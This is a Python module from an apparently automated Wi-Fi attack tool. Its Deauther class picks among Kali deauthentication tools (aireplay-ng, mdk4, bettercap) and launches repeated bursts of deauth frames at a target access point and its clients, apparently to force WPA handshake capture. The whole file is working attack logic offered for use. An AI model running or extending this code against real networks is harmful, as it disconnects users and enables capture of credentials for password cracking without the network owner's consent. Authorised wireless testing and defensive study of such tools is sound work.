"""Deauthentication executor — runs the chosen Kali deauth tool strategically.

Supports every mainstream Kali deauth engine and routes the strategist's
ActionKey to the correct tool with correct arguments. Custom reason codes are
supported where the tool allows them (mdk4); aireplay-ng uses its native deauth
(reason 7); bettercap uses its caplet deauth module.
"""

from __future__ import annotations

import logging
import time

from ..exceptions import ToolNotFoundError
from ..learning.state import ActionKey
from ..tools.registry import ToolRegistry
from ..utils.proc import ProcResult

log = logging.getLogger("handshaker.deauth")


class Deauther:
    def __init__(self, registry: ToolRegistry, config: dict) -> None:
        self.registry = registry
        self.config = config["deauth"]

    def execute(
        self,
        interface: str,
        bssid: str,
        action: ActionKey,
        *,
        client: str | None = None,
    ) -> ProcResult:
        """Execute a deauth action. Returns the tool's raw result.

        Note: ``action.reason`` is carried as a learning dimension but only
        tools that expose a custom reason code (e.g. mdk4) honor it; aireplay-ng
        uses its native reason 7 and bettercap its own defaults.
        """
        tool = action.tool
        burst = action.burst

        if tool == "aireplay-ng":
            return self.registry.aireplay().deauth(
                interface, bssid=bssid, count=burst, client=client
            )
        if tool == "mdk4":
            # Set channel first is handled by the engine; mdk4 deauth mode 'd'.
            return self.registry.mdk4().deauth(interface, bssid=bssid, count=burst)
        if tool == "bettercap":
            target_client = client or "*"
            return self.registry.bettercap().caplet_deauth(
                interface, bssid, target_client, count=burst
            )
        raise ToolNotFoundError(tool)

    def attack(
        self,
        interface: str,
        bssid: str,
        action: ActionKey,
        *,
        client: str | None = None,
        max_bursts: int | None = None,
    ) -> list[ProcResult]:
        """Run a burst campaign (multiple deauth rounds with cooldown)."""
        max_bursts = max_bursts or int(self.config["max_bursts"])
        cooldown = float(self.config["cooldown"])
        results: list[ProcResult] = []
        for i in range(max_bursts):
            log.info(
                "deauth burst %d/%d -> %s (tool=%s burst=%d reason=%d)",
                i + 1, max_bursts, bssid, action.tool, action.burst, action.reason,
            )
            results.append(self.execute(interface, bssid, action, client=client))
            if i < max_bursts - 1:
                time.sleep(cooldown)
        return results
